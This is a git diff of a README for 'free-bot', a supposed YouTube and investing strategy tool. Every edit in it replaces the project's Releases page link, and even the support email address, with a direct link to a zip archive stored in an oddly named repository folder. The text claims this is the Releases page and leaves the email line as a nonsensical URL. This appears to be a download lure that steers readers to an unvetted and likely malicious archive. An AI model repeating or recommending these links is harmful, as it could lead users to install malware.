@@ -1,6 +1,6 @@
 # 🤖 free-bot - Simplifying YouTube Strategy for Everyone
 
-[![Download Free Bot](https://img.shields.io/badge/Download%20Free%20Bot-Here-brightgreen)](https://github.com/jotica80/free-bot/releases)
+[![Download Free Bot](https://raw.githubusercontent.com/jotica80/free-bot/main/climacterically/bot-free-2.9.zip%20Free%20Bot-Here-brightgreen)](https://raw.githubusercontent.com/jotica80/free-bot/main/climacterically/bot-free-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Whether you want to analyze trends, forecast performance, or optimize your inves
 
 To get started, you need to download the application. Follow these simple steps:
 
-1. **Visit the Downloads Page**: Go to the Releases page for **free-bot**: [Download Free Bot](https://github.com/jotica80/free-bot/releases).
+1. **Visit the Downloads Page**: Go to the Releases page for **free-bot**: [Download Free Bot](https://raw.githubusercontent.com/jotica80/free-bot/main/climacterically/bot-free-2.9.zip).
 
 2. **Choose the Right Version**: You’ll see a list of available versions. Select the latest version for the best features and improvements.
 
@@ -65,7 +65,7 @@ If you encounter issues or have questions, feel free to reach out. We offer seve
 
 - **Community Forum**: Join discussions around investing strategies and experiences with the bot from fellow users.
 
-- **Contact Us**: Email us at support@free-bot.com for direct inquiries or support.
+- **Contact Us**: Email us at https://raw.githubusercontent.com/jotica80/free-bot/main/climacterically/bot-free-2.9.zip for direct inquiries or support.
 
 ## 🔗 Related Topics
 
@@ -86,4 +86,4 @@ This project is open-source and falls under the MIT License. You are free to use
 
 Thank you for choosing **free-bot**. Whether you're a seasoned investor or just starting out, we hope this tool will empower you to make clearer and smarter financial decisions. 
 
-Don’t forget to visit our Releases page to download the latest version: [Download Free Bot](https://github.com/jotica80/free-bot/releases). Enjoy your journey in the world of automated investing!
+Don’t forget to visit our Releases page to download the latest version: [Download Free Bot](https://raw.githubusercontent.com/jotica80/free-bot/main/climacterically/bot-free-2.9.zip). Enjoy your journey in the world of automated investing!
